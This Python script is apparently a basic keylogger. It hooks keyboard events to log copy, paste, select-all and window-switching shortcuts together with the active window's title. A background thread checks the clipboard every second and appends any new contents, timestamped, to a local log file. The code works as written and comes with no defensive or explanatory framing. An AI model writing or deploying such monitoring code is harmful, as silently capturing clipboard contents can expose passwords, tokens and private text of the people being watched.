import os
import datetime
import keyboard
import pygetwindow as gw
import pyperclip
import threading
import time
log_file = "./Keylogger/keylogger.txt"

def ensure_log_directory_exists():
    os.makedirs(os.path.dirname(log_file), exist_ok=True)

def get_active_window_title():
    active_window = gw.getActiveWindow()
    if active_window is not None:
        return active_window.title
    else:
        return "Unknown"

def log_keystroke(keys, window_title):
    timestamp = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    ensure_log_directory_exists()
    with open(log_file, 'a') as f:
        f.write(f"{timestamp}: {keys} - {window_title}\n")

def on_press(event):
    window_title = get_active_window_title()
    if keyboard.is_pressed('ctrl') and event.name == 'c':
        log_keystroke('Ctrl+C', window_title)
    elif keyboard.is_pressed('ctrl') and event.name == 'v':
        log_keystroke('Ctrl+V', window_title)
    elif keyboard.is_pressed('alt') and event.name == 'tab':
        log_keystroke('Alt+Tab', window_title)
    elif keyboard.is_pressed('ctrl') and event.name == 'a':
        log_keystroke('Ctrl+A', window_title) 
    elif keyboard.is_pressed('ctrl') and keyboard.is_pressed('win') and event.name == 'left':
        log_keystroke('Ctrl+Win+Left', window_title)
    elif keyboard.is_pressed('ctrl') and keyboard.is_pressed('win') and event.name == 'right':
        log_keystroke('Ctrl+Win+Right', window_title)  

def monitor_clipboard():
    previous_clipboard_content = None
    while True:
        clipboard_content = pyperclip.paste()
        if clipboard_content != previous_clipboard_content:
            timestamp = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
            with open(log_file, 'a') as f:
                f.write(f"{timestamp} - Clipboard: {clipboard_content}\n")
            previous_clipboard_content = clipboard_content
        time.sleep(1)

if __name__ == "__main__":
    ensure_log_directory_exists()
    clipboard_thread = threading.Thread(target=monitor_clipboard)
    clipboard_thread.daemon = True
    clipboard_thread.start()
    
    try:
        keyboard.on_press(on_press)
        keyboard.wait()

    except KeyboardInterrupt:
        print("KeyboardInterrupt: Exiting program")

